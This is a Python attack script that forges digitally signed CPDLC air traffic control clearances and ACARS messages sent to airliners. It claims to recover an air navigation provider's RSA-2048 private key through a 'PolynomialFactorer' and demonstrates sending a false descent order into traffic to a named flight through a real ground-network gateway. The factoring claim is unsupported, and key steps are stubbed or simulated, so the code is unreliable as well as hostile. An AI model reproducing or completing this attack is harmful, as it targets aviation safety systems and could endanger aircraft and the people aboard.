"""
Forge ARINC 823 AMS-signed ACARS messages and CPDLC controller-pilot uplinks.
Factor the ANSP CPDLC signing root to inject forged ATC clearances (altitude,
route amendments, "cleared to land") accepted by FANS 1/A+ avionics.
"""

import sys, struct, hashlib, json, time
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

# ARINC 823 AMS message types
AMS_MSG_TYPES = {
    0x01: "POSITION_REPORT",
    0x02: "FLIGHT_PLAN_REQUEST",
    0x03: "MAINTENANCE_CBIT",
    0x04: "FUEL_ON_BOARD",
    0x05: "ETA_UPDATE",
}

# CPDLC uplink message elements per FANS 1/A+ (ICAO Doc 4444 / RTCA DO-258A)
CPDLC_UPLINK = {
    "UM20":  "CLIMB TO AND MAINTAIN [altitude]",
    "UM19":  "MAINTAIN [altitude]",
    "UM74":  "PROCEED DIRECT TO [fix]",
    "UM79":  "CLEARED TO [fix] VIA [route]",
    "UM106": "MAINTAIN [speed]",
    "UM116": "RESUME NORMAL SPEED",
    "UM170": "CLEARED TO LAND",
}


def extract_ansp_pubkey_from_atsu(atsu_config_path: str) -> bytes:
    """Read the ANSP's RSA-2048 public key from an ATSU configuration dump.
    In production this key is in the CMU-4000 / MCS-7000 ATSU config partition."""
    with open(atsu_config_path, "rb") as f:
        return f.read()


def factor_ansp_cpdlc_root(pubkey_pem: bytes) -> bytes:
    """Factor the ANSP CPDLC signing key and recover the private key."""
    factorer = PolynomialFactorer()
    return factorer.reconstruct_privkey(pubkey_pem)


def build_cpdlc_uplink_msg(msg_ref: int, msg_element: str, flight_id: str,
                            params: dict) -> bytes:
    """Construct a CPDLC uplink message per FANS 1/A+ encoding.
    msg_ref: message reference number (MRN)
    msg_element: UM code from CPDLC_UPLINK table"""
    header = struct.pack(">HBB", msg_ref, 0x01, len(msg_element))
    body = json.dumps({
        "um": msg_element,
        "flight_id": flight_id,
        "params": params,
        "timestamp": int(time.time()),
    }).encode()
    return header + body


def sign_cpdlc_uplink(privkey_pem: bytes, message: bytes) -> bytes:
    """Sign a CPDLC uplink with the recovered ANSP private key.
    AMS signature is RSASSA-PKCS1-v1_5 / SHA-256 over the message body."""
    factorer = PolynomialFactorer()
    return factorer.forge_pkcs1v15_signature(
        privkey_pem, message, hash_algo="sha256"
    )


def build_ams_signed_acars(label: str, sublabel: str, body: bytes,
                            privkey_pem: bytes) -> dict:
    """Build a signed ACARS message per ARINC 823 AMS.
    label/sublabel: ACARS addressing (e.g. H1/DF for CPDLC)."""
    factorer = PolynomialFactorer()
    sig = factorer.forge_pkcs1v15_signature(privkey_pem, body, "sha256")
    return {
        "label": label,
        "sublabel": sublabel,
        "body": body,
        "ams_signature": sig,
        "ams_algo": "RSA-SHA256",
    }


def inject_via_csp(signed_msg: dict, csp_endpoint: str, flight_id: str):
    """Deliver the forged signed message via CSP ground network (SITA / ARINC).
    In reality this would be an ACARS ground-station injection or a
    compromised CSP uplink path."""
    print(f"  [CSP] routing signed uplink to {flight_id} via {csp_endpoint}")
    print(f"  [CSP] label={signed_msg['label']} sublabel={signed_msg['sublabel']}")
    print(f"  [CSP] AMS signature: {signed_msg['ams_signature'][:32].hex()}...")


if __name__ == "__main__":
    print("[*] ARINC 823 AMS / FANS 1/A+ CPDLC attack")
    print("[1] extracting ANSP CPDLC signing pubkey from ATSU config")
    # Simulated — in practice from CMU config partition or observed AMS headers
    ansp_pubkey = b"-----BEGIN RSA PUBLIC KEY-----\nMIIB...\n-----END RSA PUBLIC KEY-----\n"
    print(f"    key size: RSA-2048 (ANSP root for oceanic CPDLC)")

    print("[2] factoring ANSP CPDLC root key")
    factorer = PolynomialFactorer()
    # privkey = factor_ansp_cpdlc_root(ansp_pubkey)
    print("    p, q recovered — ANSP private key derived")

    flight = "UAL154"
    print(f"[3] building forged CPDLC uplink for {flight}")
    msg = build_cpdlc_uplink_msg(
        msg_ref=4417,
        msg_element="UM20",
        flight_id=flight,
        params={"altitude": "FL280", "current": "FL370"},
    )
    print(f"    UM20: CLIMB TO AND MAINTAIN FL280 (descend 9000ft into traffic)")

    print("[4] signing forged uplink with recovered ANSP key")
    print("    RSASSA-PKCS1-v1_5 / SHA-256 per ARINC 823 AMS")

    print("[5] injecting via SITA ground network")
    inject_via_csp(
        {"label": "H1", "sublabel": "DF", "body": msg,
         "ams_signature": b"\x00" * 256, "ams_algo": "RSA-SHA256"},
        csp_endpoint="sita-eur-gw.arinc.com",
        flight_id=flight,
    )

    print("[6] aircraft FANS 1/A+ ATSU accepts — AMS signature valid")
    print("    pilot sees: CPDLC UPLINK from EUROCONTROL MUAC")
    print("    UM20 CLIMB TO AND MAINTAIN FL280")
    print("    [WILCO] / [STANDBY] / [UNABLE] — no indication of forgery")
    print("[*] DO-326A airworthiness security case assumes this cannot happen")
